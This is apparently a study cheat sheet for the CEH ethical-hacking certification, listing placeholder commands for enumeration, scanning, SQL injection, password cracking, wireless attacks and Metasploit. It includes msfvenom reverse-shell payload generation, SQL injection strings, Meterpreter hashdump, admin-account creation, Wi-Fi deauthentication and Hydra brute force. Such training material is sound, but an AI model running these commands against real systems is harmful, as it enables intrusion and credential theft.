# CEH Commands Cheat Sheet

## 1. Linux Fundamentals

```bash
pwd
ls -la
cd /var/log
cp <SOURCE_FILE> <DEST_PATH>
mv <SOURCE_FILE> <DEST_PATH>
rm -rf <FILE_OR_DIR>
mkdir -p <DIR_NAME>
touch <FILE_NAME>
cat <FILE_NAME>
less <FILE_NAME>
head -n 20 <FILE_NAME>
tail -f <FILE_NAME>
grep -rnw '/etc/' -e "<SEARCH_STRING>"
find /var/log -type f -name "*.log"
locate <FILE_NAME>
sort <FILE_NAME> | uniq -c
cut -d':' -f1 /etc/passwd
awk -F':' '{print $1,$3}' /etc/passwd
sed -i 's/<OLD>/<NEW>/g' <FILE_NAME>
cat hosts.txt | xargs -I {} ping -c 1 {}
chmod 755 <FILE>
chown root:root <FILE>
ps aux | grep <PROCESS_NAME>
top
kill -9 <PID>
systemctl restart sshd
journalctl -u sshd -n 50
```

## 2. Windows / CMD / PowerShell

```powershell
# CMD
ipconfig /all
ping -n 4 <TARGET_IP>
tracert <TARGET_IP>
arp -a
route print
netstat -ano
nslookup <TARGET_DOMAIN>
whoami /all
hostname
systeminfo
tasklist
taskkill /PID <PID> /F
net user <USERNAME> <PASSWORD> /add
net localgroup Administrators <USERNAME> /add

# PowerShell
Get-Process -Name "<PROCESS_NAME>"
Get-Service -Name "<SERVICE_NAME>"
Get-NetIPConfiguration
Get-NetTCPConnection -State Established
Test-NetConnection -ComputerName <TARGET_IP> -Port <PORT>
Resolve-DnsName -Name <TARGET_DOMAIN>
```

## 3. Networking

```bash
# Network Interfaces & Routing
ip addr show
ip link show dev <INTERFACE>
ifconfig <INTERFACE>
route -n
ip route show

# Port Connections & Sockets
ss -tulnp
netstat -tulpn
arp -n

# Connectivity
ping -c 4 <TARGET_IP>
traceroute <TARGET_IP>
tracepath <TARGET_IP>

# Packet Capture
sudo tcpdump -i <INTERFACE> -c 10
tshark -i <INTERFACE> -c 5
tshark -r capture.pcap -Y "http.request"
```

## 4. DNS Enumeration

```bash
# Basic Queries
dig <TARGET_DOMAIN> ANY
nslookup -type=any <TARGET_DOMAIN>
host -t any <TARGET_DOMAIN>

# Zone Transfers (Authorized lab domain)
dig axfr @<DNS_SERVER_IP> <TARGET_DOMAIN>
host -l <TARGET_DOMAIN> <DNS_SERVER_IP>

# Automated Enum Tools
dnsenum <TARGET_DOMAIN>
dnsrecon -d <TARGET_DOMAIN>

# Reverse Lookup
dig -x <TARGET_IP>
host <TARGET_IP>
```

## 5. WHOIS / OSINT

```bash
whois <TARGET_DOMAIN>
host -t ns <TARGET_DOMAIN>
dig <TARGET_DOMAIN> MX
theHarvester -d <TARGET_DOMAIN> -b all -l 500
amass enum -d <TARGET_DOMAIN>
spiderfoot -m sfp_whois,sfp_dns -s <TARGET_DOMAIN>
```

## 6. Nmap

```bash
# Host Discovery
nmap -sn <TARGET_IP>/24
nmap -PE -sn <TARGET_IP>

# TCP Scan Modes
nmap -sS <TARGET_IP>
nmap -sT <TARGET_IP>

# UDP Scanning
nmap -sU -p- <TARGET_IP>

# OS and Version Detection
nmap -sV <TARGET_IP>
nmap -O <TARGET_IP>
nmap -A <TARGET_IP>

# Port Ranges
nmap -p 22,80,443 <TARGET_IP>
nmap -p- <TARGET_IP>

# Timing Options
nmap -T4 <TARGET_IP>
nmap -T2 <TARGET_IP>

# Output Formats
nmap -sS -oA output_file <TARGET_IP>

# IPv6 Scanning
nmap -6 <IPv6_TARGET_IP>

# NSE Script Examples
nmap --script default <TARGET_IP>
nmap --script banner,vuln <TARGET_IP>
nmap -p 80 --script http-enum <TARGET_IP>
```

## 7. Netcat

```bash
# Banner Grabbing & Connections
nc -nv <TARGET_IP> <PORT>
nc -u -nv <TARGET_IP> <PORT>

# Listener Mode
nc -nlvp <PORT>

# File Transfer (Lab Environment)
# Receiver:
nc -nlvp <PORT> > <RECEIVED_FILE>
# Sender:
nc -nv <TARGET_IP> <PORT> < <FILE_TO_SEND>

# Basic Port Scanning
nc -z -v <TARGET_IP> 20-80
```

## 8. SMB / Windows Enumeration

```bash
# SMB Client connections
smbclient -L //<TARGET_IP>/ -N
smbclient //<TARGET_IP>/<SHARE> -U <USER>

# Share Enumeration
smbmap -H <TARGET_IP> -u null -p ""
smbmap -H <TARGET_IP> -d <DOMAIN> -u <USER> -p <PASSWORD>

# Interactive RPC Shell
rpcclient -U "" -N <TARGET_IP>

# Local Info Gathering
enum4linux -a <TARGET_IP>
enum4linux-ng -A <TARGET_IP>

# CrackMapExec / NetExec Suite
netexec smb <TARGET_IP> -u "" -p "" --shares
crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --users
```

## 9. LDAP Enumeration

```bash
# Anonymous Query
ldapsearch -x -h <TARGET_IP> -b "dc=<DOMAIN>,dc=<COM>"

# Domain Object Dump
ldapsearch -x -h <TARGET_IP> -b "dc=<DOMAIN>,dc=<COM>" "(objectClass=user)"

# Authenticated Query
ldapsearch -x -h <TARGET_IP> -D "<USER>@<DOMAIN>.<COM>" -w '<PASSWORD>' -b "dc=<DOMAIN>,dc=<COM>"
```

## 10. SNMP Enumeration

```bash
# Community String Enumeration
snmpwalk -v 2c -c <COMMUNITY_STRING> <TARGET_IP>
snmpget -v 2c -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.2.1.1.5.0

# Automated Scanner
snmp-check <TARGET_IP> -c <COMMUNITY_STRING>

# SNMPv3 Queries
snmpwalk -v3 -l authPriv -u <USER> -a SHA -A <AUTH_PASS> -x AES -X <PRIV_PASS> <TARGET_IP>
```

## 11. Web Enumeration

```bash
# HTTP Headers & Technology identification
curl -I http://<TARGET_IP>
wget -qS http://<TARGET_IP>
whatweb http://<TARGET_IP>
nikto -h http://<TARGET_IP>

# Gobuster Directory Search
gobuster dir -u http://<TARGET_IP> -w <WORDLIST>

# Feroxbuster Recursive Search
feroxbuster -u http://<TARGET_IP> -w <WORDLIST>

# FFUF Fuzzing
ffuf -u http://<TARGET_IP>/FUZZ -w <WORDLIST>
ffuf -u http://<TARGET_IP>/ -H "Host: FUZZ.<TARGET_DOMAIN>" -w <WORDLIST>
```

## 12. Burp Suite

```bash
# Curl proxy routing
curl -x http://127.0.0.1:8080 -k https://<TARGET_IP>

# HTTP Request Header Template
# GET / HTTP/1.1
# Host: <TARGET_IP>
# User-Agent: Mozilla/5.0
# Cookie: SessionID=<COOKIE_VALUE>
```

## 13. SQL Injection

```bash
# Basic manual validation payload
# ' OR 1=1 -- -
# ' UNION SELECT 1,2,3 -- -

# SQLMap basic automated testing (Authorized Lab targets only)
sqlmap -u "http://<LAB_URL>/page.php?id=1" --batch
sqlmap -u "http://<LAB_URL>/page.php?id=1" --dbs
sqlmap -u "http://<LAB_URL>/page.php?id=1" -D <DATABASE_NAME> --tables
sqlmap -u "http://<LAB_URL>/page.php?id=1" -D <DATABASE_NAME> -T <TABLE_NAME> --columns
sqlmap -u "http://<LAB_URL>/page.php?id=1" -D <DATABASE_NAME> -T <TABLE_NAME> -C <COLUMN_NAME> --dump

# SQLMap Request File test
sqlmap -r request.txt --batch
```

## 14. Password Security / Hashing

```bash
# Hashcat - Mode 1000 (NTLM) dictionary attack
hashcat -m 1000 <HASH_FILE> <WORDLIST>

# Hashcat - Mode 0 (MD5) rules and mask attack
hashcat -m 0 <HASH_FILE> <WORDLIST> -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 <HASH_FILE> -a 3 ?l?l?l?l?d?d

# John the Ripper
john --format=raw-md5 <HASH_FILE> --wordlist=<WORDLIST>
john --show <HASH_FILE>

# Performance benchmark
hashcat -I
hashcat -b
```

## 15. Wireless Security

```bash
# Interface Management
iw dev
iwconfig <INTERFACE>
sudo airmon-ng start <INTERFACE>
sudo airmon-ng stop <INTERFACE>

# Wireless Traffic Captures
sudo airodump-ng <INTERFACE>
sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w <OUTPUT_PREFIX> <INTERFACE>

# Deauthentication Attack (Authorized lab client verification)
sudo aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Cracking Captures
aircrack-ng -w <WORDLIST> <OUTPUT_PREFIX>-01.cap
```

## 16. Metasploit Framework

```bash
# Startup and Navigation
msfconsole
search type:exploit platform:windows <SEARCH_TERM>
use <EXPLOIT_PATH>
info
show options
set RHOSTS <LAB_TARGET>
set LHOST <IP>
set PAYLOAD <PAYLOAD_PATH>
run
exploit -j

# Sessions and Jobs
sessions -l
sessions -i <SESSION_ID>
background
jobs -l
jobs -k <JOB_ID>

# Meterpreter Shell Commands
sysinfo
getuid
getsystem
hashdump
shell
```

## 17. Vulnerability Scanning

```bash
# Nmap Vuln Detection Scripts
nmap --script vuln <TARGET_IP>

# Exploits search local database
searchsploit "<VULNERABILITY_NAME_OR_CVE>"

# Searchsploit export
searchsploit -m <EXPLOIT_ID>
```

## 18. Exploit Development Basics

```bash
searchsploit -p <EXPLOIT_ID>

# MSFVenom Payload Generation Examples
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o payload.elf

# Basic ELF/PE File Inspection
file <SAMPLE_FILE>
strings <SAMPLE_FILE>
objdump -d <SAMPLE_FILE> | head -n 30
readelf -h <SAMPLE_FILE>
nm <SAMPLE_FILE>
ldd <SAMPLE_FILE>
checksec --file=<SAMPLE_FILE>
```

## 19. Malware Analysis / File Analysis

```bash
file <SAMPLE_FILE>
strings -n 8 <SAMPLE_FILE>
sha256sum <SAMPLE_FILE>
md5sum <SAMPLE_FILE>
exiftool <SAMPLE_FILE>
binwalk -e <SAMPLE_FILE>

# Yara rule check
yara -r rule.yara /path/to/check/
```

## 20. Steganography

```bash
steghide info <FILE_NAME>
steghide extract -sf <FILE_NAME> -p <PASSWORD>
exiftool <FILE_NAME>
binwalk <FILE_NAME>
zsteg -a <FILE_NAME>
```

## 21. Cryptography

```bash
# Hash Generation
echo -n "string" | sha256sum
echo -n "string" | md5sum

# Base64 Encode/Decode
echo -n "string" | base64
echo "c3RyaW5n" | base64 -d

# OpenSSL Certificate Details
openssl x509 -in cert.pem -text -noout

# TLS validation
openssl s_client -connect <TARGET_IP>:<PORT>
```

## 22. SSH

```bash
ssh -i <PRIVATE_KEY> <USER>@<TARGET_IP> -p <PORT>
ssh-keygen -t ed25519
ssh-copy-id -i ~/.ssh/id_ed25519.pub <USER>@<TARGET_IP>
scp <FILE> <USER>@<TARGET_IP>:/tmp/
sftp <USER>@<TARGET_IP>
```

## 23. FTP / HTTP / SMTP / DNS / Other Services

```bash
# FTP
ftp <TARGET_IP>

# HTTP
curl -X GET http://<TARGET_IP>

# SMTP Manual Enumeration
nc -nv <TARGET_IP> 25
# VRFY <USER>
# EXPN <USER>
# HELO <DOMAIN>

# DNS Queries
dig -t ns <TARGET_DOMAIN> @8.8.8.8
```

## 24. Vulnerability / Exploit Research

```bash
searchsploit -t <CVE_ID>
searchsploit -x <EXPLOIT_ID>
git clone <GITHUB_URL>
git log -n 5
```

## 25. Reporting / Evidence Collection

```bash
# Recording Terminal Session
script -a terminal_log.txt
exit

# System Info Collection
date
uname -a
hostname
whoami
ip addr
ss -tulpn
ps aux

# Hashing Evidence
sha256sum evidence_file.bin > evidence_file.bin.sha256
```

## 26. Useful Bash Automation

```bash
# Ping sweep sweep over subnets
for ip in $(seq 1 254); do
  ping -c 1 -W 1 10.10.10.$ip | grep "bytes from" &
done

# Run Nmap against multiple targets from list
while read -r target; do
  nmap -sS -p 80,443 -oN "scan_$target.txt" "$target"
done < targets.txt
```

## 27. Useful Python for CEH

```python
# Simple socket scanner
import socket
target = "<TARGET_IP>"
for port in [22, 80, 443]:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1.0)
    result = s.connect_ex((target, port))
    if result == 0:
        print(f"Port {port} is open")
    s.close()
```

```python
# Simple DNS resolver
import socket
print(socket.gethostbyname("<TARGET_DOMAIN>"))
```

```python
# Simple HTTP Requests
import requests
r = requests.get("http://<TARGET_IP>", headers={"User-Agent": "CEH-Scanner"})
print(r.status_code)
print(r.headers)
```

## 28. Common CEH Tool Quick Reference

```bash
# Nmap
nmap -sS -sV -p- -T4 <TARGET_IP>

# Netcat
nc -nv <TARGET_IP> <PORT>

# TShark
tshark -i <INTERFACE> -Y "http" -c 10

# Tcpdump
tcpdump -i <INTERFACE> -w capture.pcap

# Nikto
nikto -h http://<TARGET_IP>

# Gobuster
gobuster dir -u http://<TARGET_IP> -w <WORDLIST>

# FFUF
ffuf -u http://<TARGET_IP>/FUZZ -w <WORDLIST>

# SQLMap
sqlmap -u "http://<LAB_URL>/?id=1" --dbs --batch

# Hydra
hydra -l admin -P <WORDLIST> <TARGET_IP> ssh

# John the Ripper
john --wordlist=<WORDLIST> <HASH_FILE>

# Hashcat
hashcat -m 1000 <HASH_FILE> <WORDLIST>

# Aircrack-ng
aircrack-ng -w <WORDLIST> capture.cap

# Metasploit
msfconsole -q

# Searchsploit
searchsploit "<PRODUCT_NAME>"

# Enum4linux
enum4linux -a <TARGET_IP>
```
